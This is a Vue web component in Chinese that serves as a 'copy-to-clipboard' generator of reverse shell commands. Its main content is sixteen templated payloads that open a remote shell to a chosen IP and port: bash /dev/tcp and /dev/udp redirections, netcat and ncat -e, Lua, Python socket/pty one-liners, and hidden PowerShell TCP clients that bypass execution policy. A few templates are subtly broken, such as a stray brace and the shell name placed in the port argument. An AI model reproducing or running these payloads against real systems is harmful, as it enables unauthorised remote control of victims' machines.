<script setup>
import {reactive} from 'vue';

// 适合复杂数组
const web = reactive({
  ip: "8.8.8.8",
  port: "8080",
  shell: "/bin/bash", // 默认值
  name: "不编码",
})

// 定义 copy 函数：复制指定 id 的 <pre> 内容到剪切板
function copy(id) {
  const preElement = document.getElementById(id);
  if (preElement) {
    const textToCopy = preElement.innerText;  // 获取 <pre> 的文本内容
    navigator.clipboard.writeText(textToCopy)
        .then(() => {
          console.log('复制成功:', textToCopy);  // 可替换为 alert('复制成功！')
        })
        .catch(err => {
          console.error('复制失败:', err);  // 处理错误
        });
  } else {
    console.error('未找到元素:', id);
  }
}
</script>

<template>
  <div class="main_shell">
    <div class="tips input-section">
      <div class="input-row">
        <label class="label">shell种类:</label>
        <select id="shell" v-model="web.shell" class="select-box">
          <option value="/bin/sh">/bin/sh</option>
          <option value="/bin/bash">/bin/bash</option>
          <option value="sh">sh</option>
          <option value="bash">bash</option>
          <option value="ash">ash</option>
          <option value="zsh">zsh</option>
          <option value="dash">dash</option>
<!--          <option value="cmd">cmd</option>-->
<!--          <option value="powershell">powershell</option>-->
        </select>

        <!--        <label class="label">编码方式:</label>-->
        <!--        <input type="text" id="name" v-model="web.name" name="name">-->
      </div>

      <div class="input-row">
        <label class="label">IP:</label>
        <input type="text" id="ip" v-model="web.ip" name="ip">
        <label class="label">Port:</label>
        <input type="text" id="port" v-model="web.port" name="port">
      </div>
    </div>

    <div class="main_bountytips">
      <h3>反弹shell命令快捷生成:</h3>
      <div class="tips">
        <button @click="copy('cmd01')">Copy</button>
        [Linux] Bash -i:
        <pre id="cmd01">{{ web.shell }} -i >& /dev/tcp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd02')">Copy</button>
        [Linux] Bash 196 TCP:
        <pre id="cmd02">0<&196;exec 196<>/dev/tcp/{{ web.ip }}/{{ web.port }}; {{ web.shell }} <&196 >&196 2>&196</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd03')">Copy</button>
        [Linux] Bash 196 UDP:
        <pre id="cmd03">0<&196;exec 196<>/dev/udp/{{ web.ip }}/{{ web.port }}; {{ web.shell }} <&196 >&196 2>&196</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd04')">Copy</button>
        [Linux] Bash read line:
        <pre id="cmd04">exec 5<>/dev/tcp/{{ web.ip }}/{{web.port}};cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd05')">Copy</button>
        [Linux] Bash 5:
        <pre id="cmd05">{{ web.shell }} -i 5<> /dev/tcp/{{ web.ip }}/{{ web.port }} 0<&5 1>&5 2>&5</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd06')">Copy</button>
        [Linux] Bash udp:
        <pre id="cmd06">{{ web.shell }} -i >& /dev/udp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd07')">Copy</button>
        [Linux] nc -e:
        <pre id="cmd07">nc {{ web.ip }} {{ web.port }} -e {{ web.shell }}</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd08')">Copy</button>
        [Linux] ncat -e:
        <pre id="cmd08">ncat {{ web.ip }} {{ web.port }} -e {{ web.shell }}</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd09')">Copy</button>
        [Linux] Lua #1:
        <pre id="cmd09">lua -e "require('socket');require('os');t=socket.tcp();t:connect('{{web.ip}}','{{web.port}}');os.execute('{{web.shell}} -i <&3 >&3 2>&3');"</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd10')">Copy</button>
        [Linux] Python #1:
        <pre id="cmd10">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{web.ip}}}",{{web.port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{{web.shell}}","-i"]);'</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd11')">Copy</button>
        [Linux] Python #2:
        <pre id="cmd11">export RHOST="{{web.ip}}";export RPORT={{web.port}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{{web.shell}}")'</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd12')">Copy</button>
        [Linux] Python #3:
        <pre id="cmd12">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{web.ip}}",{{web.shell}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{{web.shell}}")'</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd13')">Copy</button>
        [Windows] nc.exe -e:
        <pre id="cmd13">nc.exe {{ web.ip }} {{ web.port }} -e cmd</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd14')">Copy</button>
        [Windows] ncat.exe -e:
        <pre id="cmd14">ncat.exe {{ web.ip }} {{ web.port }} -e cmd</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd15')">Copy</button>
        [Windows] PowerShell #1:
        <pre id="cmd15">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{{ web.ip }}",{{ web.port }});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
      </div>

      <div class="tips">
        <button @click="copy('cmd16')">Copy</button>
        [Windows] PowerShell #2:
        <pre
            id="cmd16">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{ web.ip }}}',{{ web.port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
      </div>


    </div>
  </div>
  <br>
</template>

<style>
button {
  padding: 0 5px;
  margin: 0;
}

textarea {
  position: fixed;
  left: -100%;
}

pre {
  font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
  font-size: 12px;
  background-color: #f6f8fa;
  overflow: auto;
  border: 1px solid #898989;
  padding: 5px;
  margin-top: 5px;
  margin-bottom: 5px;
}

.main_shell {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
  padding: 15px;
  border: 1px solid #898989;
}

.main_shell h3 {
  padding-top: 15px;
  font-size: 16px;
}

.main_bountytips {
  max-width: 100%;
  margin: auto;
  background-color: #fff;
}

.main_bountytips h3 {
  padding-top: 15px;
  font-size: 16px;
  margin-top: 1px;
  margin-bottom: 5px;
}

.tips {
  padding-bottom: 5px;
  padding-top: 5px;
  border-bottom: 1px dashed #999;
}

.tips ul {
  display: block;
  list-style-type: disc;
  margin-block-start: 1em;
  margin-block-end: 1em;
  margin-inline-start: 0px;
  margin-inline-end: 0px;
  padding-inline-start: 15px;
}

.tips ul li {
  display: list-item;
  text-align: -webkit-match-parent;
  list-style-type: square;
}

.tips .tips_title {
  font-size: 14px;
  padding-bottom: 10px;
}

.tips blockquote {
  padding: 0 15px;
  margin: 0;
  color: #666;
  border-left: 4px solid #ddd;
}

input[type=text] {
  border: 1px solid #898989;
  font-size: 15px;
  width: 150px;
  padding: 2px 5px;
}

/* 新增下拉框样式 */
select.select-box {
  border: 1px solid #898989;
  font-size: 15px;
  width: 150px;
  padding: 2px 5px;
  //height: 28px; /* 与输入框高度一致 */
}

/* 新增样式：输入框对齐 */
.input-section {
  display: flex;
  flex-direction: column;
  gap: 10px; /* 行间距 */
}

.input-row {
  display: flex;
  align-items: center; /* 垂直居中对齐 */
  gap: 10px; /* 输入组间距 */
}

.label {
  width: 70px; /* 固定标签宽度，确保对齐 */
  text-align: right; /* 右对齐标签文本 */
  margin-right: 5px; /* 标签与输入框间距 */
  background-color: #f6f8fa;
  border: 1px dotted #898989;
  padding: 2px 5px;
  //height: 28px; /* 与输入框高度一致 */
  display: flex;
  align-items: center;
  justify-content: flex-end;
}
</style>